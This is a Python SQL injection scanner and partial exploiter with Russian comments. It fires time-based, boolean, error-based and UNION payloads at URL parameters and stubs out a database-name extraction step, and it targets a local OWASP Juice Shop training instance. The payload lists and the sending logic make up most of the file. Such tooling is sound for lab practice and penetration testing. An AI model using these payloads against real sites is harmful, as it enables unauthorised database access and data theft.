"""
Real Working SQL Injection Detector & Exploiter
Основано на sqlmap техниках
"""
import requests
import time
import re
from typing import Optional, Tuple


class RealSQLiDetector:
    """Реальное обнаружение SQL Injection без фолсов"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = False
        self.timeout = 30
        self.base_response_length = 0
        self.base_response_time = 0
        
    def get_response(self, url: str, timeout: int = None) -> Tuple[requests.Response, float]:
        """Запрос с измерением времени"""
        if timeout is None:
            timeout = self.timeout
        
        start = time.time()
        resp = self.session.get(url, timeout=timeout, allow_redirects=True)
        elapsed = time.time() - start
        
        return resp, elapsed
    
    def detect_time_based_sqli(self, base_url: str, param: str) -> bool:
        """
        Time-based SQL Injection detection
        РЕАЛЬНАЯ проверка по времени - не фолс!
        """
        # Базовый запрос
        base_resp, base_time = self.get_response(f"{base_url}?{param}=test")
        
        # Time-based payload (5 секунд задержка)
        payloads = [
            f"{param}='; WAITFOR DELAY '0:0:5'--",  # MSSQL
            f"{param}=' AND SLEEP(5)--",  # MySQL
            f"{param}=' AND PG_SLEEP(5)--",  # PostgreSQL
            f"{param}='; SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--",  # Generic
        ]
        
        for payload in payloads:
            test_url = f"{base_url}?{payload}"
            
            try:
                # Делаем 3 запроса для статистики
                times = []
                for i in range(3):
                    _, elapsed = self.get_response(test_url, timeout=60)
                    times.append(elapsed)
                
                avg_time = sum(times) / len(times)
                
                # Если средняя задержка >= 4 секунд - это SQLi!
                if avg_time >= 4.0:
                    print(f"[✓] TIME-BASED SQLi НАЙДЕН!")
                    print(f"  Параметр: {param}")
                    print(f"  Средняя задержка: {avg_time:.2f}s")
                    print(f"  Payload: {payload}")
                    return True
                    
            except Exception as e:
                continue
        
        return False
    
    def detect_boolean_based_sqli(self, base_url: str, param: str) -> bool:
        """
        Boolean-based SQL Injection detection
        Сравниваем ответы на TRUE и FALSE условия
        """
        # Запрос с TRUE условием
        true_url = f"{base_url}?{param}=' AND 1=1--"
        true_resp, _ = self.get_response(true_url)
        
        # Запрос с FALSE условием
        false_url = f"{base_url}?{param}=' AND 1=2--"
        false_resp, _ = self.get_response(false_url)
        
        # Базовый запрос
        base_resp, _ = self.get_response(f"{base_url}?{param}=test")
        
        # Сравниваем длины ответов
        true_len = len(true_resp.text)
        false_len = len(false_resp.text)
        base_len = len(base_resp.text)
        
        # Если TRUE даёт такой же ответ как базовый, а FALSE отличается - это SQLi
        if abs(true_len - base_len) < 50 and abs(false_len - base_len) > 100:
            print(f"[✓] BOOLEAN-BASED SQLi НАЙДЕН!")
            print(f"  Параметр: {param}")
            print(f"  TRUE длина: {true_len}")
            print(f"  FALSE длина: {false_len}")
            print(f"  Базовая длина: {base_len}")
            return True
        
        # Альтернативная проверка - ищем различия в контенте
        if true_resp.status_code == 200 and false_resp.status_code != 200:
            print(f"[✓] BOOLEAN-BASED SQLi (статус коды)!")
            print(f"  TRUE статус: {true_resp.status_code}")
            print(f"  FALSE статус: {false_resp.status_code}")
            return True
        
        return False
    
    def detect_error_based_sqli(self, base_url: str, param: str) -> bool:
        """
        Error-based SQL Injection detection
        Ловим SQL ошибки в ответе
        """
        # Payloads которые вызывают SQL ошибки
        payloads = [
            f"{param}='",  # Unclosed quote
            f"{param}=' OR '1'='1",  # OR injection
            f"{param}=' UNION SELECT NULL--",  # UNION
            f"{param}=' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",  # Error based
            f"{param}=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",  # MySQL error
        ]
        
        # SQL error patterns
        sql_errors = [
            r"SQL syntax.*MySQL",
            r"ORA-\d+",  # Oracle
            r"PostgreSQL.*ERROR",
            r"SQLite3::SQLException",
            r"Microsoft OLE DB Provider",
            r"Unclosed quotation mark",
            r"Invalid column name",
            r"Syntax error.*SQL",
            r"PDOException.*SQL",
            r"you have an error in your SQL",
        ]
        
        for payload in payloads:
            test_url = f"{base_url}?{payload}"
            
            try:
                resp, _ = self.get_response(test_url)
                response_text = resp.text
                
                for pattern in sql_errors:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        print(f"[✓] ERROR-BASED SQLi НАЙДЕН!")
                        print(f"  Параметр: {param}")
                        print(f"  Payload: {payload}")
                        print(f"  Ошибка: {re.search(pattern, response_text, re.IGNORECASE).group()}")
                        return True
                        
            except Exception as e:
                continue
        
        return False
    
    def detect_union_based_sqli(self, base_url: str, param: str) -> bool:
        """
        UNION-based SQL Injection detection
        Пробуем извлечь данные
        """
        # UNION payloads для подбора количества колонок
        payloads = []
        for i in range(1, 20):
            nulls = ",".join(["NULL"] * i)
            payloads.append(f"{param}=' UNION SELECT {nulls}--")
        
        for payload in payloads:
            test_url = f"{base_url}?{payload}"
            
            try:
                resp, _ = self.get_response(test_url)
                
                # UNION успешен если появились данные в неожиданном формате
                response_text = resp.text.lower()
                
                # Ищем признаки успешного UNION
                if ("null" in response_text and 
                    resp.status_code == 200 and 
                    len(response_text) > 100):
                    
                    # Проверяем что это не просто текст "NULL"
                    if response_text.count("null") >= payloads.index(payload) + 1:
                        print(f"[✓] UNION-BASED SQLi НАЙДЕН!")
                        print(f"  Параметр: {param}")
                        print(f"  Колонок: {payloads.index(payload) + 1}")
                        print(f"  Payload: {payload}")
                        return True
                        
            except Exception as e:
                continue
        
        return False
    
    def exploit_sqli_data_extraction(self, base_url: str, param: str, num_columns: int) -> dict:
        """
        Извлечение данных через SQL Injection
        """
        results = {
            "database": "",
            "tables": [],
            "users": []
        }
        
        # Извлекаем имя базы данных
        payload = f"{param}=' UNION SELECT database(),{'NULL,'*(num_columns-2)}NULL--"
        test_url = f"{base_url}?{payload}"
        
        try:
            resp, _ = self.get_response(test_url)
            # Парсим ответ чтобы найти имя БД
            # (реальная логика зависит от того как Juice Shop возвращает данные)
        except:
            pass
        
        return results
    
    def scan(self) -> dict:
        """
        Полное сканирование на SQL Injection
        """
        print(f"[*] Сканирование {self.target_url} на SQL Injection...")
        
        results = {
            "vulnerable": False,
            "type": [],
            "parameter": "",
            "payload": ""
        }
        
        # Определяем параметры для тестирования
        # Для Juice Shop это обычно ?q= для поиска
        test_params = ["q", "search", "query", "id", "name"]
        
        for param in test_params:
            print(f"[*] Тестирование параметра: {param}")
            
            # Time-based
            if self.detect_time_based_sqli(self.target_url, param):
                results["vulnerable"] = True
                results["type"].append("Time-based")
                results["parameter"] = param
            
            # Boolean-based
            if self.detect_boolean_based_sqli(self.target_url, param):
                results["vulnerable"] = True
                results["type"].append("Boolean-based")
                results["parameter"] = param
            
            # Error-based
            if self.detect_error_based_sqli(self.target_url, param):
                results["vulnerable"] = True
                results["type"].append("Error-based")
                results["parameter"] = param
            
            # UNION-based
            if self.detect_union_based_sqli(self.target_url, param):
                results["vulnerable"] = True
                results["type"].append("UNION-based")
                results["parameter"] = param
        
        return results


if __name__ == "__main__":
    # Тест на Juice Shop
    target = "http://127.0.0.1:3000/rest/products/search"
    
    detector = RealSQLiDetector(target)
    results = detector.scan()
    
    print("\n" + "="*50)
    print("RESULTS")
    print("="*50)
    print(f"Target: {target}")
    print(f"Vulnerable: {results['vulnerable']}")
    print(f"Types: {', '.join(results['type']) if results['type'] else 'None'}")
    print(f"Parameter: {results['parameter']}")
